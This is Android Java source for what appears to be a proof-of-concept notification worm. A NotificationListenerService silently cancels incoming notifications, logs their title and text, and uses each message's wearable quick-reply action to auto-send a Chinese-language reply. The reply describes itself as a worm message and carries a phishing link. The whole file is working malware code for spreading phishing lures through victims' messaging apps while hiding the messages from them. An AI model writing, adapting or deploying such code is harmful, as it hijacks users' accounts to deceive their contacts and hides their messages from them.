package com.example.notificationwearwrom;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.RemoteInput;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.annotation.RequiresApi;

import java.util.ArrayList;

import static android.app.Notification.FLAG_GROUP_SUMMARY;

@SuppressLint({"NewApi", "OverrideAbstract"})
public class NotificationReceiver extends NotificationListenerService {
    private static final String TAG = "NotificationReceiver";
    NotificationManager notificationManager;

    @Override
    public void onCreate() {
        super.onCreate();
        this.notificationManager = (NotificationManager)this.getApplicationContext().getSystemService(Context.NOTIFICATION_SERVICE);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification statusBarNotification) {
        //super.onNotificationPosted(statusBarNotification);

        if ((statusBarNotification.getNotification().flags & FLAG_GROUP_SUMMARY) != 0) {
            return;
        }
        // 取消通知栏
        this.cancelNotification(statusBarNotification.getKey());
        this.notificationManager.cancel(statusBarNotification.getId());
        try {
            String title = (String)statusBarNotification.getNotification().extras.get("android.title");
            String text = (String)statusBarNotification.getNotification().extras.get("android.text");
            Log.d(TAG, "onNotificationPosted title: " + title);
            Log.d(TAG, "onNotificationPosted text: " + text);
        }catch (Exception e){
            e.printStackTrace();
        }

        // 自动回复
        Bundle bundle = new Bundle();
        NotificationWear notificationWear = getNotificationWear(statusBarNotification);
        reply(notificationWear.RemoteInputs, bundle, notificationWear.actionIntent);

    }

    public NotificationWear getNotificationWear(StatusBarNotification statusBarNotification) {
        NotificationWear notificationWear = new NotificationWear();
        Bundle bundle = statusBarNotification.getNotification().extras;
        for (String key : bundle.keySet()) {
            Object value = bundle.get(key);
            Log.d(TAG, "getNotificationWear key: " + key + ", value: " + value);
            if ("android.wearable.EXTENSIONS".equals(key)) {
                Bundle wearBundle = ((Bundle) value);
                for (String keyInner : wearBundle.keySet()) {
                    Object valueInner = wearBundle.get(keyInner);

                    if (keyInner != null && valueInner != null) {
                        if ("actions".equals(keyInner) && valueInner instanceof ArrayList) {
                            ArrayList<Notification.Action> actions = new ArrayList<>();
                            actions.addAll((ArrayList) valueInner);
                            for (Notification.Action act : actions) {
                                if (act.getRemoteInputs() != null) {//API > 20 needed
                                    notificationWear.actionIntent = act.actionIntent;
                                    notificationWear.RemoteInputs = act.getRemoteInputs();
                                    return notificationWear;
                                }
                            }
                        }
                    }
                }
            }
        }

        return null;
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT_WATCH)
    public void reply(RemoteInput[] remoteInputs, Bundle bundle, PendingIntent pendingIntent) {

        if (remoteInputs == null || bundle == null || pendingIntent == null)
            return;

        Intent localIntent = new Intent();
        localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        Bundle localBundle = bundle;

        for (RemoteInput remoteInput : remoteInputs) {
            localBundle.putCharSequence(remoteInput.getResultKey(), "蠕虫自动回复消息，钓鱼链接为：http://www.fishlink.com/xxx");
        }
        RemoteInput.addResultsToIntent(remoteInputs, localIntent, localBundle);
        try {
            pendingIntent.send(this.getApplicationContext(), 0, localIntent);
        } catch (PendingIntent.CanceledException e) {
            Log.e("", "replyToLastNotification error: " + e.getLocalizedMessage());
        }
    }

    public class NotificationWear{
        public android.app.RemoteInput[] RemoteInputs;
        public PendingIntent actionIntent;
    }
}